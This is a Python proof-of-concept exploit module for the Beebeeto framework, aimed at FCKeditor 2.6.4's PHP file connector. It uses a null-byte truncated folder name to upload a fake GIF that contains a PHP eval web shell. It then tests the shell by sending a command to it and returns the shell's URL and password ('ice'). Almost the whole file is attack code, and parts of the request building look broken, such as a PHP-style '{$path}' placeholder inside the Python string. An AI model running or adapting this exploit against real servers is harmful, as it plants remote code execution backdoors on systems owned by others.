#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0132',
            'name': 'fckeditor 2.6.4 %00截断任意文件上传漏洞 Exploit',
            'author': 'ppfox',
            'create_date': '2014-10-31',
        },
        # 协议相关信息pp
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'fckeditor',  # 漏洞所涉及的应用名称
            'vul_version': ['2.6.4'],  # 受漏洞影响的应用版本
            'type': 'FIle Upload',  # 漏洞类型
            'tag': ['fckeditor', 'fckeditor file upload', 'file upload', 'php'],  # 漏洞相关tag
            'desc': 'fckeditor 2.6 has a file upload.',  # 漏洞描述
            'references': ['http://www.webshell.cc/3459.html',  # 参考链接
            ],
        },
    }

    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        filename = "ice.gif"
        foldername = "ice.php%00.gif"
        connector = "editor/filemanager/connectors/php/connector.php";
        proto, rest = urllib.splittype(url)
        host, rest = urllib.splithost(rest)
        payload = "-----------------------------265001916915724\r\n"
        payload += "Content-Disposition: form-data; name=\"NewFile\"; filename=\"ice.gif\"\r\n"
        payload += "Content-Type: image/jpeg\r\n\r\n"
        payload += 'GIF89a'+"\r\n"+'<?php eval($_POST[ice]) ?>'+"\n"
        payload += "-----------------------------265001916915724--\r\n"
        packet = "POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder="+foldername+" HTTP/1.0\r\n";
        packet += "Host: "+ host +"\r\n"
        packet += "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n"
        packet += "Content-Length: "+ str(len(payload))+"\r\n"
        packet += "Connection: close\r\n\r\n"
        packet += payload


        webshell_url = url + '/uploadfile/file/ice.php'
        #print webshell_url
        if args['options']['verbose']:
            print '[*] Request URL: ' + url
            print '[*] POST Content: ' + packet

        urllib2.urlopen(url, data=packet)
        request = urllib2.Request(webshell_url, data="e=echo strrev(gwesdvjvncqwdijqiwdqwduhq);")
        response = urllib2.urlopen(request).read()

        if 'gwesdvjvncqwdijqiwdqwduhq'[::-1] in response:
            args['success'] = True
            args['poc_ret']['vul_url'] = url
            args['poc_ret']['Webshell'] = webshell_url
            args['poc_ret']['Webshell_PWD'] = 'ice'
            return args
        args['success'] = False
        return args

    verify = exploit

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())